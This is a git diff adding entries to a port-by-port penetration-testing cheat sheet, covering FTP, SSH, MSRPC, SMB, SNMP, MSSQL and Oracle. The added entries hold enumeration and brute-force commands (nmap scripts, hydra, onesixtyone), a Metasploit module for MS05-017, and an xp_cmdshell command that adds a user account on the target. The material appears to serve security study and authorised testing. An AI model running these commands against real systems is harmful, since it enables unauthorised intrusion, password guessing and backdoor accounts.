@@ -211,6 +211,11 @@ local: accesschk.exe remote: accesschk.exe
 331888 bytes sent in 0.27 secs (1.1515 MB/s)
 ```
 
+* [Enumeration Commands](http://www.lifeoverpentest.com/2018/02/enumeration-cheat-sheet-for-windows.html)
+```
+nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn 192.168.1.10
+```
+
 [Back](#summary)
 
 ## Port 22 - SSH 
@@ -232,6 +237,13 @@ wget https://raw.githubusercontent.com/Rhynorater/CVE-2018-15473-Exploit/master/
 
 python sshUsernameEnumExploit.py --port 22 --outputFile enum --outputFormat list --username root 10.11.1.35
 python sshUsernameEnumExploit.py --port 22 --outputFile enum --outputFormat list --username Administrator 10.11.1.35
+```
+
+(Enumeration Commands)[http://www.lifeoverpentest.com/2018/02/enumeration-cheat-sheet-for-windows.html]
+```
+nmap -p 22 -n -v -sV -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
+nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
+nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10
 ```
 
 [Back](#summary)
@@ -437,11 +449,13 @@ An attacker could use this to change the time. Which might cause denial of servi
 ## Port 135 - MSRPC
 Windows RPC-Port
 Check for Ports 25 and 445
-Vulnerable to MS ? TO DO
+Vulnerable to MS05-17
 * Enumerate
 ``` nmap135
-nmap 192.168.0.101 --script=msrpc-enum
+nmap -n -v -sV -Pn -p 135 --script=msrpc-enum 192.168.1.10 
 ```
+* Metasploit module
+	* exploit/windows/dcerpc/ms05_017_msmq
 
 [Back](#summary)
 
@@ -476,8 +490,9 @@ echo "" && sleep .1
 ```smbclient
 smbclient -L 192.168.1.102
 smbclient //192.168.1.106/tmp
-smbclient \\\\192.168.1.105\\ipc$ -U john 
-smbclient //192.168.1.105/ipc$ -U john
+smbclient \\\\192.168.1.105\\ipc$ -U administrator 
+smbclient //192.168.1.105/ipc$ -U administrator
+smbclient \\192.168.1.106\ipc$ -U administrator
 ```
 TO DO: Anonymous Login 
 * If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb.
@@ -524,6 +539,7 @@ metasploit: use exploit/windows/smb/psexec
 ```nmap139445
 nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse, smb-os-discovery.nse
 nmap -p 139,445 --script "smb-vuln*" 10.11.11.#
+nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smbv2-enabled,smbv2-enabled,smb-vuln* 192.168.1.10
 ```
 TO DO: FINISH THIS
 
@@ -574,6 +590,29 @@ Common community strings
 public
 private
 community
+```
+
+[Enumeration commands](http://www.lifeoverpentest.com/2018/02/enumeration-cheat-sheet-for-windows.html)
+```
+nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat 192.168.1.10
+onesixtyone -c communities.txt 192.168.1.10
+snmp-check -t 192.168.1.10 -c public
+snmpwalk -c public -v 1 192.168.1.10 [MIB_TREE_VALUE]
+hydra -P passwords.txt -v 192.168.1.10 snmp
+
+#Communities.txt
+public
+private
+community
+
+#SNMP MIB Trees
+1.3.6.1.2.1.25.1.6.0 System Processes
+1.3.6.1.2.1.25.4.2.1.2 Running Programs
+1.3.6.1.2.1.25.4.2.1.4 Processes Path
+1.3.6.1.2.1.25.2.3.1.4 Storage Units
+1.3.6.1.2.1.25.6.3.1.2 Software Name
+1.3.6.1.4.1.77.1.2.25 User Accounts
+1.3.6.1.2.1.6.13.1.3 TCP Local Ports
 ```
 
 * [Longer list of common community strings](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt)
@@ -691,6 +730,14 @@ Default port for Microsoft SQL.
 sqsh -S 192.168.1.101 -U sa
 ```
 
+[Enumeration Commands](http://www.lifeoverpentest.com/2018/02/enumeration-cheat-sheet-for-windows.html)
+```
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.10
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password  192.168.1.10
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user lifeoverpentest MySecretPassword123 /add" 192.168.1.10
+sqsh -S 192.168.1.10 -U sa
+```
+
 ### Execute Commands
 ```exec
 # To execute the date command to the following after logging in
@@ -721,6 +768,13 @@ auxiliary/scanner/oracle/sid_brute
 ```
 * Connect to the datbaase with sqlplus
 * [Reference](http://www.red-database-security.com/wp/itu2007.pdf)
+* [Enumeration Commands](http://www.lifeoverpentest.com/2018/02/enumeration-cheat-sheet-for-windows.html)
+```
+nmap -n -v -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,userdb=users.txt 192.168.1.10
+nmap -n -v -sV -Pn -p 1521 --script=oracle-sid-brute 192.168.1.10
+tnscmd10g version -h 192.168.1.10
+tnscmd10g status -h 192.168.1.10
+```
 
 ## Ports 1748, 1754, 1808, 1809 - Oracle
 These are also ports used by oracle on windows. They run Oracles Intelligent Agent.
